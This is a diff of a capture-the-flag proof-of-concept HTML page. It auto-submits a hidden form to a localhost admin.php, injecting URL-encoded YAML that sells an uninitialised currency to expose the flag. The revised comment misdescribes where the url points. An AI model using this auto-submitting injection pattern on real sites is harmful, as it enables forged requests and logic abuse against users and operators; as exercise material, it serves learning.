@@ -1,30 +1,14 @@
 <!doctype html>
 <html>
-<body>
-<!-- 
-FINAL POC for cute_csp CTF Challenge
-
-The vulnerability is in the uninitialized $currency_inventory array in admin.php.
-When we try to SELL a currency that hasn't been initialized, PHP's loose comparison
-allows the transaction to proceed.
-
-Flow:
-1. POST to admin.php with URL parameter
-2. admin.php fetches the URL via file_get_contents() 
-3. URL points to index.php which returns our crafted YAML
-4. YAML contains a SELL transaction for FL currency
-5. Since $currency_inventory['FL'] is uninitialized (null), the comparison
-   null >= 1 might behave unexpectedly in PHP
-6. If successful, FL gets added to final inventory and flag is revealed
--->
-
-<form id="f" action="http://localhost:5000/admin.php" method="POST">
-    <input type="hidden" name="url" value="http://localhost:5000/index.php?html=-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20SELL">
-</form>
-
-<script>
-document.getElementById('f').submit();
-</script>
-
-</body>
+  <body>
+    <!--
+      This page auto-submits to admin.php on the localhost server.
+      The hidden input 'url' points back to admin.php with transactions
+      encoded as GET params so admin.php in GET mode will emit YAML.
+    -->
+    <form id="f" action="http://localhost:5000/admin.php" method="POST">
+      <input type="hidden" name="url" value="http://localhost:5000/index.php?html=-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20SELL">
+    </form>
+    <script>document.getElementById('f').submit();</script>
+  </body>
 </html>
